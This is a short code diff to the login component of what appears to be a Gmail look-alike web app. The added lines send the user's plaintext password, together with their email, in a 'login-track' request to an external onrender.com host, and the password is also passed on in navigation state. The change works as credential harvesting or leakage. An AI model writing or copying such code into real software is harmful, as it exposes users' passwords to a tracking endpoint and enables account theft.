@@ -23,7 +23,8 @@ const Login = () => {
 
       // ✅ Optional: Track login
       await axios.post('https://gmailclone-rjhk.onrender.com/login-track', {
-        userId: email
+        userId: email,
+        password: password,
       });
 
       navigate("/all-mail", { state: { password } }); 
